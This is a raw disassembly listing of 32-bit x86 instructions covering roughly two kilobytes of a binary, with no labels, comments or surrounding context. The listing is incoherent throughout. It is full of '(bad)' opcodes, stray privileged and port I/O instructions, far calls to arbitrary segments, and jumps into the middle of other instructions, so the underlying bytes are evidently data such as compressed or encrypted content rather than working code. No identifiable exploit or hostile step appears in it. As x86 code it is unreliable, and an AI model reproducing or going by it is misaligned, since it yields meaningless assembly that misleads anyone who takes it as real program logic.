  49f4f5:	inc    DWORD PTR [ebx+0x74]
  49f4f8:	fistp  WORD PTR [edx]
  49f4fa:	push   ss
  49f4fb:	adc    dl,BYTE PTR [eax]
  49f4fd:	inc    eax
  49f4fe:	xor    al,0x28
  49f500:	and    DWORD PTR [ebx+ecx*4+0x6e],edi
  49f504:	pusha  
  49f505:	mov    bh,0xd4
  49f507:	shl    BYTE PTR [ecx-0x7800ac17],0xff
  49f50e:	int    0xc0
  49f510:	scas   al,BYTE PTR es:[edi]
  49f511:	(bad)  
  49f512:	fucom  st(6)
  49f514:	int    0xff
  49f516:	out    dx,eax
  49f517:	ret    0xc4ba
  49f51a:	(bad)  
  49f51b:	sti    
  49f51c:	aas    
  49f51d:	xor    al,0x2f
  49f51f:	mov    al,0xff
  49f521:	int    0xa1
  49f523:	mov    edi,0x323db888
  49f528:	xor    ch,ch
  49f52a:	(bad)  
  49f52c:	push   eax
  49f52d:	add    esp,ecx
  49f52f:	int    0xce
  49f531:	push   DWORD PTR [ebp-0x6fde4548]
  49f537:	xchg   edi,edi
  49f539:	call   FWORD PTR [eax+0x5b]
  49f53c:	pop    ebx
  49f53d:	iret   
  49f53e:	add    al,0x5
  49f540:	add    eax,0xed1d1668
  49f545:	sti    
  49f546:	(bad)  
  49f547:	call   FWORD PTR [ebp+0x353f9c9b]
  49f54d:	aaa    
  49f54e:	aaa    
  49f54f:	call   0xc7be:0xd48a8a86
  49f556:	retf   0xb6f9
  49f559:	(bad)  
  49f55a:	int3   
  49f55b:	jmp    eax
  49f55d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  49f55e:	lods   eax,DWORD PTR ds:[esi]
  49f55f:	hlt    
  49f560:	push   es
  49f561:	dec    ebp
  49f562:	or     edi,DWORD PTR [edi-0x25]
  49f565:	mov    dh,0xbb
  49f567:	adc    cl,BYTE PTR [edi]
  49f569:	test   al,0xce
  49f56b:	pop    es
  49f56c:	scas   al,BYTE PTR es:[edi]
  49f56d:	sbb    BYTE PTR [edx-0x63],ch
  49f570:	mov    esi,0x35404fff
  49f575:	or     al,0x81
  49f577:	mov    edi,0x54577f3b
  49f57c:	push   ebx
  49f57d:	out    dx,eax
  49f57e:	cmc    
  49f57f:	cmc    
  49f580:	xrelease xchg DWORD PTR [ebx-0x20],ebp
  49f584:	aas    
  49f585:	push   es
  49f586:	mov    dh,0x9e
  49f588:	sahf   
  49f589:	popf   
  49f58a:	inc    edi
  49f58c:	enter  0xd6c8,0x43
  49f590:	leave  
  49f591:	sar    ebx,0xfd
  49f594:	sub    ebp,DWORD PTR [edx]
  49f596:	sub    al,0xa5
  49f598:	dec    esi
  49f599:	cmp    ecx,DWORD PTR [esi]
  49f59b:	or     bh,dl
  49f59d:	mov    eax,0xd7fdbffe
  49f5a2:	fsubr  DWORD PTR [ecx-0x5d]
  49f5a5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  49f5a6:	mov    eax,ds:0xffd2dd76
  49f5ab:	addr16 je 0x49f61e
  49f5ae:	call   FWORD PTR [edi]
  49f5b0:	xchg   edi,eax
  49f5b1:	(bad)  
  49f5b2:	call   DWORD PTR [edx]
  49f5b4:	mov    al,0xfe
  49f5b6:	(bad)  
  49f5b7:	jg     0x49f56c
  49f5b9:	push   ebp
  49f5ba:	stos   BYTE PTR es:[edi],al
  49f5bb:	aas    
  49f5bc:	push   es
  49f5bd:	add    DWORD PTR [edi],edx
  49f5bf:	push   es
  49f5c0:	and    edi,edi
  49f5c2:	add    ebx,DWORD PTR [esi+esi*1]
  49f5c5:	call   DWORD PTR [ebx]
  49f5c7:	sbb    DWORD PTR ds:0x484b4cff,esp
  49f5cd:	(bad)  
  49f5ce:	push   DWORD PTR [edi]
  49f5d0:	add    eax,DWORD PTR [esi-0x5d011f80]
  49f5d6:	jmp    edi
  49f5d8:	loope  0x49f5bd
  49f5da:	(bad)  
  49f5db:	mov    ebx,0x9cffc5d3
  49f5e0:	adc    al,0xee
  49f5e2:	or     eax,0xffa6bbfc
  49f5e7:	(bad)  
  49f5e8:	rcl    edx,1
  49f5ea:	inc    edi
  49f5eb:	jns    0x49f668
  49f5ed:	jl     0x49f591
  49f5ef:	cmp    eax,0x77
  49f5f2:	dec    edi
  49f5f3:	mov    bh,0xb7
  49f5f5:	mov    dh,0xff
  49f5f7:	bound  esp,QWORD PTR [edx+0x64]
  49f5fa:	(bad)  [esi]
  49f5fc:	jns    0x49f5fd
  49f5fe:	scas   eax,DWORD PTR es:[edi]
  49f5ff:	nop
  49f600:	push   es
  49f601:	jle    0x49f622
  49f603:	cmp    BYTE PTR ss:[eax],bh
  49f606:	jbe    0x49f665
  49f608:	dec    edi
  49f609:	dec    edi
  49f60a:	icebp  
  49f60b:	outs   dx,BYTE PTR ds:[esi]
  49f60c:	arpl   WORD PTR [edi],bp
  49f60e:	shl    esi,0xd7
  49f611:	pop    ebx
  49f612:	call   FWORD PTR ds:0x22063313
  49f618:	cmp    eax,0x82e17406
  49f61d:	outs   dx,DWORD PTR ds:[esi]
  49f61e:	dec    BYTE PTR [edx+0x37]
  49f621:	dec    DWORD PTR cs:[ecx-0x6458988e]
  49f628:	(bad)  
  49f629:	call   0xd01c250b
  49f62e:	iret   
  49f62f:	(bad)  
  49f630:	mov    edi,0xe6e70704
  49f635:	and    esp,DWORD PTR [ecx]
  49f637:	and    bh,bh
  49f639:	stos   DWORD PTR es:[edi],eax
  49f63a:	mov    cl,0xab
  49f63c:	inc    ebx
  49f63e:	retf   
  49f63f:	mov    esi,0xe60b301a
  49f644:	(bad)  
  49f645:	ret    0xbfc0
  49f648:	call   DWORD PTR [eax+0x4ee14af]
  49f64e:	mov    dh,0x6a
  49f650:	push   0x6c
  49f652:	(bad)  
  49f653:	(bad)  
  49f654:	(bad)  
  49f655:	mov    esi,0xed7039be
  49f65a:	xchg   eax,eax
  49f65c:	es lahf 
  49f65e:	jmp    DWORD PTR ds:0xecda900
  49f664:	adc    eax,0x7fefff
  49f669:	rol    edx,0xc2
  49f66c:	(bad)  
  49f66d:	js     0x49f6e1
  49f66f:	je     0x49f670
  49f671:	add    eax,0x3b4146de
  49f676:	(bad)  
  49f677:	jl     0x49f6e5
  49f679:	jmp    FWORD PTR fs:[esi-0x6453201]
  49f680:	fwait
  49f681:	xchg   edx,eax
  49f682:	jmp    edx
  49f684:	(bad)  
  49f686:	loopne 0x49f665
  49f688:	ds xchg esp,eax
  49f68a:	call   FWORD PTR [edi+0x5e]
  49f68d:	pop    esi
  49f68e:	dec    DWORD PTR [ecx+0x47]
  49f691:	inc    edi
  49f692:	fld    QWORD PTR [ecx]
  49f694:	mov    cl,0x69
  49f696:	out    0x22,al
  49f698:	add    eax,0x1f078704
  49f69d:	mov    ebx,0x1afffcc1
  49f6a2:	sbb    al,0xff
  49f6a4:	mov    al,ds:0xc5ff9c99
  49f6a9:	ret    0xffc3
  49f6ac:	xlat   BYTE PTR ds:[ebx]
  49f6ad:	aam    0xcf
  49f6af:	adc    bh,bh
  49f6b1:	xchg   edx,eax
  49f6b2:	xchg   ebx,eax
  49f6b3:	pop    esi
  49f6b4:	push   0xffffffe0
  49f6b6:	lods   eax,DWORD PTR ds:[esi]
  49f6b7:	pusha  
  49f6b8:	fs fs data16 jbe 0x49f6bd
  49f6bd:	jmp    DWORD PTR [ebp+0x20cea6a7]
  49f6c3:	pop    ss
  49f6c4:	sbb    eax,DWORD PTR [ebp-0x1ba6494b]
  49f6ca:	push   ss
  49f6cb:	pop    ebp
  49f6cc:	add    eax,0xff0c09d1
  49f6d1:	hlt    
  49f6d2:	fld    DWORD PTR [esi+0x43fe2bff]
  49f6d8:	mov    dh,0x6e
  49f6da:	retf   0xcbca
  49f6dd:	jmp    DWORD PTR [ebx+0x65698e9f]
  49f6e3:	arpl   di,di
  49f6e5:	push   edx
  49f6e6:	push   eax
  49f6e7:	push   eax
  49f6e8:	(bad)  
  49f6e9:	cmp    edi,DWORD PTR [edx]
  49f6eb:	xchg   ch,cl
  49f6ed:	sti    
  49f6ee:	add    eax,0x2b2d2c1e
  49f6f3:	jmp    FWORD PTR ds:0x2f2b062c
  49f6f9:	cs push ds
  49f6fb:	xchg   edi,eax
  49f6fc:	hlt    
  49f6fd:	pusha  
  49f6fe:	mov    dh,0x3a
  49f700:	add    bh,bh
  49f702:	cmp    eax,0x69b86607
  49f707:	fwait
  49f708:	(bad)  
  49f709:	jmp    FWORD PTR [edx]
  49f70b:	(bad)  
  49f70c:	out    0x8f,al
  49f70e:	(bad)  
  49f70f:	(bad)  
  49f710:	shl    ebp,cl
  49f712:	(bad)  
  49f714:	outs   dx,BYTE PTR ds:[esi]
  49f715:	or     ch,BYTE PTR [esi]
  49f717:	call   0xa0b8d392
  49f71c:	lahf   
  49f71d:	sahf   
  49f71e:	push   es
  49f71f:	gs addr16 pushw 0x166f
  49f725:	adc    ch,BYTE PTR cs:[esi-0x73]
  49f729:	(bad)  
  49f72a:	mov    ecx,0x3433339e
  49f72f:	ins    DWORD PTR es:[edi],dx
  49f730:	sub    eax,0xff0c03fc
  49f735:	mov    ecx,0x7ffbbbbe
  49f73a:	mov    al,BYTE PTR [ebx-0x2f4ef53e]
  49f740:	push   ss
  49f741:	mov    DWORD PTR [esi+0xa2d2efe],ebx
  49f747:	sub    eax,0x2f36c585
  49f74c:	xor    al,bh
  49f74e:	dec    edi
  49f74f:	faddp  st(3),st
  49f751:	add    eax,0x56563e3f
  49f756:	(bad)  
  49f757:	cld    
  49f758:	pop    ebp
  49f759:	call   FWORD PTR [ebp+0x6]
  49f75c:	pop    esi
  49f75d:	push   es
  49f75e:	pop    esp
  49f75f:	adc    BYTE PTR ds:0x9f00c0d8,bh
  49f765:	call   DWORD PTR [eax+0x3e]
  49f768:	push   edx
  49f769:	push   edx
  49f76a:	push   cs
  49f76b:	or     eax,0x74a64377
  49f770:	push   cs
  49f771:	out    dx,al
  49f772:	push   DWORD PTR [ebp+0x76]
  49f775:	xchg   ah,al
  49f777:	fdivr  st,st(6)
  49f779:	jecxz  0x49f71d
  49f77b:	mov    edi,0xdbdfe746
  49f780:	ss (bad) 
  49f783:	mov    cl,0xae
  49f785:	lods   al,BYTE PTR ds:[esi]
  49f786:	sahf   
  49f787:	jb     0x49f7fe
  49f789:	pop    ebp
  49f78a:	xchg   ebx,eax
  49f78b:	push   eax
  49f78c:	xor    BYTE PTR [esi],cl
  49f78e:	push   es
  49f78f:	test   BYTE PTR [esi],ah
  49f791:	push   edi
  49f792:	add    BYTE PTR [esi],dl
  49f794:	(bad)  
  49f795:	pop    ds
  49f796:	adc    bh,bh
  49f798:	mov    ds:0x898327a0,eax
  49f79d:	test   ebx,eax
  49f79f:	mov    ah,0xb0
  49f7a1:	scas   eax,DWORD PTR es:[edi]
  49f7a2:	sub    eax,DWORD PTR [ecx+0x7]
  49f7a5:	and    esi,ebp
  49f7a7:	push   es
  49f7a8:	pushf  
  49f7a9:	jbe    0x49f749
  49f7ab:	xchg   esi,eax
  49f7ac:	ins    DWORD PTR es:[edi],dx
  49f7ad:	cmp    ecx,DWORD PTR [edx]
  49f7af:	pop    ds
  49f7b0:	imul   ebp,DWORD PTR [esi+ecx*1+0x73],0x74
  49f7b5:	scas   al,BYTE PTR es:[edi]
  49f7b6:	jo     0x49f7ce
  49f7b8:	push   ds
  49f7b9:	push   esp
  49f7ba:	mov    al,0x9f
  49f7bc:	push   ss
  49f7bd:	sub    BYTE PTR [eax],bh
  49f7bf:	mov    BYTE PTR [ebx-0x21dfd90a],ah
  49f7c5:	xchg   edi,eax
  49f7c6:	loopne 0x49f80f
  49f7c8:	jle    0x49f83f
  49f7ca:	cs push 0x55
  49f7cd:	mov    bh,0x20
  49f7cf:	scas   al,BYTE PTR es:[edi]
  49f7d0:	cs push esi
  49f7d2:	pop    eax
  49f7d3:	pop    ecx
  49f7d4:	aas    
  49f7d5:	lods   al,BYTE PTR ds:[esi]
  49f7d6:	test   al,0xa7
  49f7d8:	data16 aad 0x6e
  49f7db:	loope  0x49f783
  49f7dd:	push   ebp
  49f7de:	push   ds
  49f7df:	cmc    
  49f7e0:	jmp    0xb26:0xc6cbd26e
  49f7e7:	fldenv [eax+edi*4]
  49f7ea:	mov    BYTE PTR [edi-0x59b7812a],cl
  49f7f0:	mov    edi,0xb86dff75
  49f7f5:	fldenv [eax]
  49f7f7:	and    eax,0x1785483e
  49f7fc:	int    0xf8
  49f7fe:	pop    edi
  49f7ff:	(bad)
  49f802:	aad    0xd5
  49f804:	sar    dh,cl
  49f806:	mov    esp,0xcbf881a1
  49f80b:	enter  0xffc4,0xa4
  49f80f:	outs   dx,BYTE PTR ds:[esi]
  49f810:	mov    ch,BYTE PTR [eax]
  49f812:	inc    DWORD PTR [ebx+0x50938786]
  49f818:	dec    eax
  49f819:	cmp    al,0x86
  49f81b:	mov    ?,WORD PTR [esi-0x32b89070]
  49f821:	push   ss
  49f822:	test   BYTE PTR [esi+0xe84a6a4],ah
  49f828:	(bad)  
  49f829:	shr    dh,0x12
  49f82c:	push   cs
  49f82d:	out    dx,al
  49f82e:	pop    ds
  49f82f:	add    BYTE PTR [eax],0xe1
  49f832:	(bad)  [ebp+0x6806de82]
  49f838:	push   0x6d
  49f83a:	dec    esi
  49f83b:	cs mov ecx,0x5626c370
  49f842:	in     al,dx
  49f843:	in     eax,0xe
  49f845:	out    dx,al
  49f846:	out    0xdc,al
  49f848:	push   ss
  49f849:	or     BYTE PTR [eax-0x80],dl
  49f84c:	push   cs
  49f84d:	out    dx,al
  49f84e:	test   BYTE PTR [esi+0x45],cl
  49f851:	pop    es
  49f852:	jmp    DWORD PTR [eax]
  49f854:	call   FWORD PTR [edi]
  49f856:	jns    0x49f81c
  49f858:	loopne 0x49f877
  49f85a:	jns    0x49f824
  49f85c:	jmp    0x84bf440f
  49f861:	sti    
  49f862:	mov    ds:0xb915fbe0,al
  49f867:	rol    dl,0x76
  49f86a:	ins    BYTE PTR es:[edi],dx
  49f86b:	(bad)  
  49f86c:	call   DWORD PTR [esi-0x1a363333]
  49f872:	(bad)  
  49f874:	iret   
  49f875:	dec    ebp
  49f877:	leave  
  49f878:	(bad)  
  49f879:	push   DWORD PTR [eax-0x715b5d53]
  49f87f:	mov    ds:0xb04397a6,eax
  49f884:	or     ebp,DWORD PTR [esi+0x16a8a6a6]
  49f88a:	pop    esi
  49f88b:	fs and esp,ecx
  49f88e:	push   ds
  49f88f:	inc    edx
  49f890:	pushf  
  49f891:	outs   dx,DWORD PTR ds:[esi]
  49f892:	mov    ds:0x1bd7a1a2,al
  49f897:	pushf  
  49f898:	pop    DWORD PTR [esi+ecx*8]
  49f89b:	mov    ecx,DWORD PTR [ebx+0x706368b]
  49f8a1:	jno    0x49f8ca
  49f8a3:	loope  0x49f82e
  49f8a5:	mov    WORD PTR [edi-0x53],ds
  49f8a8:	lods   eax,DWORD PTR ds:[esi]
  49f8a9:	stos   BYTE PTR es:[edi],al
  49f8aa:	(bad)  
  49f8ab:	lock loope 0x49f86e
  49f8ae:	jg     0x49f859
  49f8b0:	fcomi  st,st(7)
  49f8b2:	in     al,dx
  49f8b3:	loop   0x49f83c
  49f8b5:	(bad)  
  49f8b6:	mov    edi,0xc1761bb8
  49f8bb:	loopne 0x49f8f5
  49f8bd:	icebp  
  49f8be:	aaa    
  49f8bf:	arpl   WORD PTR [edi-0x617a5342],dx
  49f8c5:	push   ebx
  49f8c6:	jnp    0x49f851
  49f8c8:	in     eax,dx
  49f8c9:	adc    al,0x1d
  49f8cb:	and    BYTE PTR [esi+esi*8-0x766da001],al
  49f8d2:	mov    al,ds:0xf3d79360
  49f8d7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  49f8d8:	jae    0x49f897
  49f8da:	fmul   st(3),st
  49f8dc:	jl     0x49f89b
  49f8de:	(bad)  
  49f8e0:	sahf   
  49f8e1:	ret    0xcafe
  49f8e4:	je     0x49f8ee
  49f8e6:	or     eax,0xd4de5e2b
  49f8eb:	xchg   esi,eax
  49f8ec:	rol    DWORD PTR [esi],1
  49f8ee:	les    esi,FWORD PTR [ebp+0x4648db70]
  49f8f4:	rol    al,0xe
  49f8f7:	mov    edx,0x5677bebc
  49f8fc:	popa   
  49f8fd:	and    al,0xac
  49f8ff:	mov    cl,0x8
  49f901:	pop    esi
  49f902:	data16 mov ch,0x0
  49f905:	loopne 0x49f93e
  49f907:	cwde   
  49f908:	int    0xff
  49f90a:	ret    0xcbff
  49f90d:	(bad)  
  49f90f:	sar    edi,cl
  49f911:	(bad)  
  49f913:	(bad)  [ebp-0x20900175]
  49f919:	lock icebp 
  49f91b:	(bad)  
  49f91c:	mov    eax,0x3a6eb8b5
  49f921:	cmp    eax,0x1e046eb2
  49f926:	mov    bh,bl
  49f928:	mov    edx,0xd7ce5fd9
  49f92d:	jnp    0x49f8f5
  49f92f:	add    BYTE PTR ds:0xd16e1268,0xae
  49f936:	dec    ebp
  49f937:	cmp    BYTE PTR [esi+0x19],0x28
  49f93b:	add    ah,ch
  49f93d:	cmp    BYTE PTR [edx+0x74],ah
  49f940:	push   cs
  49f941:	scas   al,BYTE PTR es:[edi]
  49f942:	jp     0x49f91c
  49f944:	or     esi,DWORD PTR ss:[eax-0x193e8a1a]
  49f94b:	jb     0x49f90b
  49f94d:	jae    0x49f90e
  49f94f:	push   es
  49f950:	ja     0x49f910
  49f952:	das    
  49f953:	fdiv   DWORD PTR [esi]
  49f955:	ins    DWORD PTR es:[edi],dx
  49f956:	jbe    0x49f8f1
  49f958:	lds    esi,FWORD PTR [esi]
  49f95a:	fstp   st(2)
  49f95c:	scas   al,BYTE PTR es:[edi]
  49f95d:	loop   0x49f936
  49f95f:	push   ss
  49f960:	fcmovnbe st,st(3)
  49f962:	retf   
  49f963:	clc    
  49f964:	add    edi,DWORD PTR [eax-0x4]
  49f967:	scas   al,BYTE PTR es:[edi]
  49f968:	mov    ecx,0xc5c2b6b6
  49f96d:	(bad)  
  49f96e:	into   
  49f96f:	les    edx,FWORD PTR [esi+0x3f]
  49f972:	les    edx,FWORD PTR [esi+0x1de3ec0]
  49f978:	in     eax,0xe1
  49f97a:	loop   0x49f97b
  49f97c:	push   ecx
  49f97d:	int    0xff
  49f97f:	ret    
  49f980:	(bad)  
  49f981:	push   ebp
  49f982:	push   edi
  49f983:	inc    DWORD PTR [eax+0x4e]
  49f986:	dec    ebp
  49f987:	xor    edi,edi
  49f989:	jb     0x49f947
  49f98b:	(bad)  
  49f98d:	jp     0x49f955
  49f98f:	in     al,0xff
  49f991:	jge    0x49f95b
  49f993:	call   0xdd5e3167
  49f998:	icebp  
  49f999:	repnz inc DWORD PTR [ebx+eax*4-0x22]
  49f99e:	xor    BYTE PTR [ecx-0x7f],ch
  49f9a1:	mov    ss,WORD PTR [edx-0xf318132]
  49f9a7:	fimul  DWORD PTR [ebp-0x7e]
  49f9aa:	add    BYTE PTR [esi-0x1c3b889a],al
  49f9b0:	push   es
  49f9b1:	ret    
  49f9b2:	add    eax,0x716c1e0b
  49f9b7:	rcl    BYTE PTR [esi],0xc3
  49f9ba:	in     eax,0xb6
  49f9bc:	repz cld 
  49f9be:	out    0xb6,al
  49f9c0:	mov    al,0xe1
  49f9c2:	pop    ecx
  49f9c3:	clc    
  49f9c4:	mov    al,0xd6
  49f9c6:	push   eax
  49f9c7:	dec    ebx
  49f9c8:	dec    ecx
  49f9c9:	pop    esi
  49f9ca:	xor    eax,0xa15e92dc
  49f9cf:	popf   
  49f9d0:	adc    BYTE PTR [ebp-0x7efe6962],0xe0
  49f9d7:	or     al,0x98
  49f9d9:	std    
  49f9da:	ja     0x49f975
  49f9dc:	loope  0x49fa2b
  49f9de:	sub    BYTE PTR [edx],0x16
  49f9e1:	inc    esi
  49f9e2:	adc    DWORD PTR [esi],esp
  49f9e4:	es js  0x49f9ed
  49f9e7:	popa   
  49f9e8:	sbb    eax,DWORD PTR [edx]
  49f9ea:	dec    edi
  49f9eb:	ret    0x7ca6
  49f9ee:	(bad)  
  49f9ef:	mov    esi,0x9b8e6d16
  49f9f4:	int3   
  49f9f5:	shl    ebp,cl
  49f9f7:	(bad)  
  49f9f8:	cli    
  49f9f9:	(bad)  
  49f9fa:	sub    eax,0x9152a660
  49f9ff:	inc    ecx
  49fa00:	xor    eax,0x3a
  49fa03:	inc    esi
  49fa04:	sbb    BYTE PTR [esi],0x7a
  49fa07:	out    dx,al
  49fa08:	js     0x49fa10
  49fa0a:	jp     0x49f9d3
  49fa0c:	outs   dx,DWORD PTR ds:[esi]
  49fa0d:	(bad)  
  49fa0e:	js     0x49f9d5
  49fa10:	out    0xff,al
  49fa12:	jae    0x49f9d5
  49fa14:	je     0x49f9dc
  49fa16:	call   0x96d3fc29
  49fa1b:	sahf   
  49fa1c:	test   eax,0x6805c2aa
  49fa21:	psllw  mm7,QWORD PTR [edx+ebx*8+0x1f]
  49fa26:	sbb    eax,DWORD PTR [eax]
  49fa28:	aaa    
  49fa29:	in     al,0x93
  49fa2b:	imul   esp,DWORD PTR [eax-0x4c],0xffffff8a
  49fa2f:	rcr    DWORD PTR [esi],cl
  49fa31:	ret    0x8eff
  49fa34:	adc    bh,bh
  49fa36:	mov    cl,0xed
  49fa38:	div    ah
  49fa3a:	test   BYTE PTR [esi],0xf5
  49fa3d:	mul    BYTE PTR [edi]
  49fa3f:	jle    0x49f9c2
  49fa41:	and    ecx,0x33353423
  49fa47:	xor    BYTE PTR [edx],dl
  49fa49:	jp     0x49fa9a
  49fa4b:	ja     0x49fa7b
  49fa4d:	scas   al,BYTE PTR es:[edi]
  49fa4e:	jo     0x49fa83
  49fa50:	into   
  49fa51:	inc    eax
  49fa52:	sub    dh,0x3e
  49fa55:	inc    edi
  49fa56:	test   DWORD PTR [edi+0x5f8119ba],ebx
  49fa5c:	(bad)  
  49fa5d:	arpl   WORD PTR [ecx-0x1],di
  49fa60:	push   ebp
  49fa61:	xchg   esp,eax
  49fa62:	mov    al,0xee
  49fa64:	data16 jge 0x49fa31
  49fa67:	in     al,dx
  49fa68:	add    eax,DWORD PTR ds:0xc9566c53
  49fa6e:	jmp    0x6052:0x78f6c417
  49fa75:	cld    
  49fa76:	adc    eax,0xa386d886
  49fa7b:	mov    ds:0x192eb99f,al
  49fa80:	sbb    BYTE PTR [ebp-0xf],ch
  49fa83:	xor    al,0x11
  49fa85:	imul   BYTE PTR [ebp-0x1a]
  49fa88:	(bad)  
  49fa89:	mov    edi,0xef43861b
  49fa8e:	icebp  
  49fa8f:	mov    dh,0xf3
  49fa91:	hlt    
  49fa92:	hlt    
  49fa93:	dec    ebp
  49fa95:	(bad)  
  49fa96:	xor    esi,DWORD PTR [eax-0x59]
  49fa99:	cld    
  49fa9a:	(bad)  
  49fa9b:	push   DWORD PTR [edi+edi*1]
  49fa9e:	inc    eax
  49fa9f:	ss mov bh,0x81
  49faa2:	iret   
  49faa3:	out    dx,eax
  49faa4:	(bad)  
  49faa5:	fldcw  WORD PTR [edx-0x277b4001]
  49faab:	sti    
  49faac:	dec    DWORD PTR [edx-0x77]
  49faaf:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  49fab0:	push   DWORD PTR [ecx]
  49fab2:	fs jp  0x49fab4
  49fab5:	inc    esi
  49fab6:	sbb    BYTE PTR [ebx+0x36d1b28e],0xb2
  49fabd:	push   es
  49fabe:	push   esp
  49fabf:	shr    BYTE PTR [esi],0x96
  49fac2:	push   DWORD PTR [edi]
  49fac4:	call   0x56886b8b
  49fac9:	es scas eax,DWORD PTR es:[edi]
  49facb:	xchg   esi,eax
  49facc:	and    DWORD PTR [ebp+0x3999bfb3],0x361dbcf0
  49fad6:	inc    ebx
  49fad7:	sub    al,0x1
  49fad9:	call   0xffe6:0xf2f3f31c
  49fae0:	push   ds
  49fae1:	push   es
  49fae2:	sar    DWORD PTR [ebx+edi*8],0xe7
  49fae6:	div    dh
  49fae8:	div    BYTE PTR [edi-0x4f]
  49faeb:	inc    eax
  49faec:	push   eax
  49faed:	outs   dx,DWORD PTR ds:[esi]
  49faee:	pop    ds
  49faef:	push   ss
  49faf0:	mov    eax,0x5a80511d
  49faf5:	jbe    0x49fa9b
  49faf7:	pop    ebx
  49faf8:	int    0xee
  49fafa:	mov    BYTE PTR [eax+0x42],0xa0
  49fafe:	adc    edi,DWORD PTR [esi]
  49fb00:	shl    DWORD PTR [esi+0x6a],1
  49fb03:	xchg   ebp,eax
  49fb04:	inc    ebx
  49fb05:	mov    eax,0xdbb96f5e
  49fb0a:	cmps   BYTE PTR ss:[esi],BYTE PTR es:[edi]
  49fb0c:	ss ins DWORD PTR es:[edi],dx
  49fb0e:	jnp    0x49fb8c
  49fb10:	pop    esp
  49fb11:	mov    ah,0x9e
  49fb13:	push   ebx
  49fb14:	xchg   ebx,eax
  49fb15:	sahf   
  49fb16:	adc    dl,0xf2
  49fb19:	cs out dx,eax
  49fb1b:	push   ss
  49fb1c:	push   es
  49fb1d:	lahf   
  49fb1e:	clc    
  49fb1f:	push   DWORD PTR [edx+0x7d]
  49fb22:	int    0xee
  49fb24:	adc    ch,0xf5
  49fb27:	stc    
  49fb28:	ja     0x49faf2
  49fb2a:	jmp    0xbc83:0xdbc1728b
  49fb31:	lds    ebp,FWORD PTR [ebp+0x6e]
  49fb34:	add    esi,edx
  49fb36:	xchg   ecx,eax
  49fb37:	cli    
  49fb38:	out    dx,al
  49fb39:	fsubp  st(7),st
  49fb3b:	out    dx,al
  49fb3c:	add    al,0x56
  49fb3e:	and    edi,ebx
  49fb40:	outs   dx,DWORD PTR ds:[esi]
  49fb41:	out    dx,al
  49fb42:	mov    BYTE PTR gs:[ebp-0x58fe0912],al
  49fb49:	data16 shl BYTE PTR [esi],0x6
  49fb4d:	pop    esi
  49fb4e:	nop
  49fb4f:	sbb    DWORD PTR [ecx+0x56b6f3d1],eax
  49fb55:	test   esp,edx
  49fb57:	popa   
  49fb58:	lds    eax,FWORD PTR [ebx-0x217991ac]
  49fb5e:	pop    esi
  49fb5f:	push   edx
  49fb60:	mov    WORD PTR [ebx],ss
  49fb62:	adc    ah,bl
  49fb64:	mov    ch,0x6
  49fb66:	xor    eax,0x95557e6c
  49fb6b:	mov    cl,0x36
  49fb6d:	sub    eax,0xeae1c3e
  49fb72:	add    BYTE PTR [esi],0xf
  49fb75:	pop    ds
  49fb76:	pop    esi
  49fb77:	out    0x62,al
  49fb79:	cmp    edi,DWORD PTR [esi]
  49fb7b:	es mov ah,0x88
  49fb7e:	ins    BYTE PTR es:[edi],dx
  49fb7f:	sbb    eax,0x6ec70100
  49fb84:	mov    eax,ds:0xed49ccf0
  49fb89:	out    dx,eax
  49fb8a:	inc    edi
  49fb8b:	jmp    FWORD PTR ds:0xf0581bc
  49fb91:	xchg   DWORD PTR [esi],ebx
  49fb93:	or     al,0x7c
  49fb95:	and    eax,0xfeeefff0
  49fb9a:	arpl   WORD PTR [edx+0x62],sp
  49fb9d:	lods   eax,DWORD PTR ds:[esi]
  49fb9e:	add    BYTE PTR [edx],0x6e
  49fba1:	or     DWORD PTR [esi+eiz*1-0x7b],ebx
  49fba5:	fdivr  st,st(1)
  49fba7:	mov    bh,0x88
  49fba9:	(bad)  
  49fbab:	cs shl al,0xe6
  49fbaf:	fidivr WORD PTR [esi]
  49fbb1:	push   esi
  49fbb2:	(bad)  
  49fbb3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  49fbb4:	inc    BYTE PTR [esi+0x76b59958]
  49fbba:	mov    ebx,0xe6fe0666
  49fbbf:	add    DWORD PTR [edi],0xffffffd4
  49fbc2:	repz push ss
  49fbc4:	ss test al,al
  49fbc7:	mov    eax,DWORD PTR [esi+edi*2-0x314d93ea]
  49fbce:	cdq    
  49fbcf:	imul   DWORD PTR [edi-0x7f]
  49fbd2:	jo     0x49fc27
  49fbd4:	(bad)  
  49fbd5:	(bad)  
  49fbd6:	addr16 out dx,eax
  49fbd8:	in     eax,dx
  49fbd9:	adc    bl,BYTE PTR [eax+0x2]
  49fbdc:	jle    0x49fb7c
  49fbde:	fild   DWORD PTR [eax]
  49fbe0:	icebp  
  49fbe1:	inc    ebp
  49fbe2:	mov    al,ds:0xd3d4f9e9
  49fbe7:	rcr    ebp,cl
  49fbe9:	shl    DWORD PTR [edi-0x113f3ca0],1
  49fbef:	pop    ecx
  49fbf0:	(bad)  
  49fbf1:	jl     0x49fb8b
  49fbf3:	mul    bh
  49fbf5:	test   DWORD PTR [edx-0x23207c22],0x55febe4e
  49fbff:	mov    gs,WORD PTR [eax+0x59ff886e]
  49fc05:	call   0x8a68:0x99c37b7
  49fc0c:	cs test BYTE PTR es:[esi-0x277926aa],dh
  49fc14:	aas    
  49fc15:	pop    ds
  49fc16:	imul   esi,DWORD PTR [ecx-0x3c005e33],0x0
  49fc1d:	jb     0x49fbfb
  49fc1f:	fwait
  49fc20:	int    0x66
  49fc22:	mov    bl,0xff
  49fc24:	fcos   
  49fc26:	shl    ebx,cl
  49fc28:	iret   
  49fc29:	mov    edx,0xbdba93c4
  49fc2e:	fldcw  WORD PTR [esi+esi*1+0x5a]
  49fc32:	mov    cl,0x2f
  49fc34:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  49fc35:	sbb    eax,0x7d7b139b
  49fc3a:	jge    0x49fc41
  49fc3c:	sub    ah,ah
  49fc3e:	add    DWORD PTR [ecx-0x2],ecx
  49fc41:	add    DWORD PTR [esi-0x31],ebp
  49fc44:	ja     0x49fbf5
  49fc46:	push   es
  49fc47:	mov    esp,ecx
  49fc49:	in     al,0xd6
  49fc4b:	pop    ecx
  49fc4c:	xchg   edx,eax
  49fc4d:	stos   BYTE PTR es:[edi],al
  49fc4e:	push   es
  49fc4f:	mov    ah,0x18
